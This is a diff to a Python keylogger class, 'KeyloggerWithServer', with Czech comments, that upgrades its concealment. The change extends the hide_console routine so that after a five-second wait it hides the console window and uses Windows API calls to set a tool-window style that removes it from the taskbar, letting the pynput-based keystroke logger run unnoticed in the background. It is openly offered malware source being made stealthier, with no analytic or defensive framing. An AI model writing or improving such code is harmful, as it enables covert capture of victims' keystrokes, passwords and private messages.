@@ -1,4 +1,3 @@
-# Vylepšene oproti tretimu ze okno skryje
 import pynput.keyboard
 import threading
 import socket
@@ -30,11 +29,21 @@ class KeyloggerWithServer:
             return "127.0.0.1"
     
     def hide_console(self):
-        """Skryje konzolové okno"""
+        """Kompletně skryje konzolové okno z hlavní liště"""
         try:
-            # Skryje konzoli (funguje na Windows)
-            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-        except:
+            # Získání handle konzolového okna
+            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+            if hwnd:
+                # Kompletně skryje okno z hlavní liště
+                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
+                
+                # Odstraní z hlavní liště (taskbar)
+                GWL_EXSTYLE = -20
+                WS_EX_TOOLWINDOW = 0x00000080
+                current_style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
+                ctypes.windll.user32.SetWindowLongW(hwnd, GWL_EXSTYLE, current_style | WS_EX_TOOLWINDOW)
+                
+        except Exception as e:
             pass  # Pokud selže, program pokračuje normálně
     
     def append_to_log(self, string):
@@ -159,7 +168,7 @@ class KeyloggerWithServer:
         # Počká 5 sekund než skryje okno
         time.sleep(5)
         
-        # Skryje konzolové okno
+        # Kompletně skryje konzolové okno
         self.hide_console()
         
         # Drží program běžící na pozadí
